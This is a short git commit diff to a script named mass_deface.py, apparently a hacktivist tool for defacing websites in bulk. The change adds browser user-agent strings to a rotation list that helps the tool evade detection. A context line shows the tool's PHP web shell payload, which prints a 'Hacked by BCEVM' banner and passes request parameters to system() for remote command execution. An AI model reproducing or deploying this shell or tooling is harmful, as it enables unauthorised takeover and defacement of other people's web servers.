c3660c0fe6c4d2b6acbe1902c88b34bf0f33028c
Bcevm <arab.bnn@protonmail.com>
2025-05-24 20:38:09 +0700

    Update mass_deface.py

--- mass_deface.py
+++ mass_deface.py
@@ -22,6 +22,8 @@ SHELL_CODE = "<?php echo 'Hacked by BCEVM - HACKTIVIST INDONESIA'; system($_GET[
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64)"
 ]
 
